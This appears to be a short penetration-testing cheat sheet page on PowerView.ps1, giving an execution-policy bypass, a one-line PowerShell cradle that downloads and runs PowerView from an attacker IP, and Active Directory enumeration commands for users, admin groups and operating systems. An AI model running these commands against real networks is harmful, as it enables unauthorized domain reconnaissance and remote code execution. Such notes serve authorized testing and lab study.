# PowerView.ps1

{% tabs %}
{% tab title="Bypass PowerShell" %}
```powershell
# -ep bypasses the execution policy of powershell allowing you to easily run scripts
powershell -ep bypass
```
{% endtab %}

{% tab title="Start PowerView" %}
```powershell
# download it from attacker
iex(new-object net.webclient).downloadstring('http://10.10.14.4:9090/PowerView.ps1')

# launch it
. .\Downloads\PowerView.ps1
```
{% endtab %}

{% tab title="Useful Commands" %}
```powershell
# Enumerate domain users
Get-NetUser | select cn
# Enumerate domain groups : 
Get-NetGroup -GroupName *admin*
# Enumerate domain OS :
Get-NetComputer -fulldata | select operatingsystem
```

**LIST**

{% embed url="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" %}
PowerView Commands
{% endembed %}
{% endtab %}
{% endtabs %}
